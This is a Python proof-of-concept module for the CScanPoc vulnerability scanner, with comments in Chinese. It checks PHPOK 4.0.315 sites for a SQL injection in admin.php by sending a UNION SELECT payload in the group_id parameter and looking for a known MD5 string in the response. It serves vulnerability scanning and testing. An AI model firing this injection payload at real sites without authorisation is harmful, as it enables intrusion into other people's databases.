# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'PHPOK_0001'  # 平台漏洞编号，留空
    name = 'PHPOK 4.0.315 /framework/ajax/admin_opt.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-22'  # 漏洞公布时间
    desc = '''
        PHPOK是一套允许用户高度自由配置的企业站程序，基于LGPL协议开源授权。
        PHPOK企业站 4.0.315 /framework/ajax/admin_opt.php SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPOK'  # 漏洞应用名称
    product_version = '4.0.315'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cefc6da8-8114-4192-9a1b-9702779227b2'
    author = '国光'  # POC编写者
    create_date = '2018-05-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(target=self.target)+(
                '/admin.php?c=ajax&f=exit&filename=opt&group_id=1 union select '+'3,1,0,md5(3.14),1,6 %23&identifier=1')

            req = requests.get(verify_url)
            if "4beed3b9c4a886067de0e3a094246f78" in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
